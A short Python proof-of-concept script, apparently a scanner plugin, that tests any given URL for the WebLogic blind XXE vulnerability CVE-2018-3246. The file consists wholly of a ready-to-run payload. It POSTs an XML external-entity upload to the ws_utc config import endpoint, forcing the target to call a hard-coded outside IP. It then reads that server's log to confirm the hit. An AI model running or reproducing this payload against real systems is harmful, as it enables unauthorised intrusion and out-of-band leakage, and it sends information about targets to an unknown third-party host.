#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: weblogic blind XXE漏洞(CVE-2018-3246)
referer: http://www.freebuf.com/vuls/186862.html
author: Lucifer
description: blind XXE。
'''
import sys
import time
import json
import hashlib
import datetime
import warnings
import requests
def run(url):
        result = ['weblogic blind XXE漏洞(CVE-2018-3246)', '', '']
        headers = {
            "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryUFcVz4AB2dQvWbyH",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
            }
        payload = "/ws_utc/resources/ws/config/import?timestamp=123123"
        vulnurl = url + payload
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        post_data = "------WebKitFormBoundaryUFcVz4AB2dQvWbyH\r\nContent-Disposition: form-data; name=\"import_file_name\"; filename=\"1.xml\"\r\nContent-Type: text/xml\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://45.76.158.91:6868/"+md5_str+"\">%remote;]>\n\r\n------WebKitFormBoundaryUFcVz4AB2dQvWbyH--\r\n"
        try:
            req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
            eye_url = "http://45.76.158.91/web.log"
            time.sleep(6)
            reqr = requests.get(eye_url, headers=headers, timeout=10, verify=False)
            if md5_str in reqr.text:
                result[2] = '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
